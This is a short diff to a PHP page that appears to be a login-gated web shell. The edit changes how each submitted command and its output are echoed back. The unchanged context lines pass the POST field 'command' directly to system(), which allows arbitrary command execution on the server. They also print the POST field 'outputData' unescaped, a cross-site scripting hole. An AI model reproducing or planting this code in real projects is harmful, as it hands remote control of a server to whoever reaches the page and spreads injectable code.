@@ -163,6 +163,7 @@ if(!$_SESSION['loggedIn']) {
 			<?php if(isset($_POST['outputData'])) echo $_POST['outputData'];?>
 			<?php if(isset($_POST['command'])&&!empty($_POST['command'])) {
 				disable_ob();
+				echo getUserNameElement() . htmlentities($_POST['command']) . "<br>\n";
 				$command = $_POST['command'];
 				$r = @system($command);
 			} ?>
@@ -175,7 +176,7 @@ if(!$_SESSION['loggedIn']) {
                    <textarea name="outputData" style="display:none" id="outD"><?php 
 				   if(isset($_POST['outputData'])) {
 				   $res = htmlentities($_POST['outputData']);
-				   $res .= getUserNameElement() . htmlentities($_POST['command']) . $r;
+				   $res .= getUserNameElement() . htmlentities($_POST['command']) . "<br>\n" . $r;
 				   echo $res;
 				   }
 				   ?></textarea>
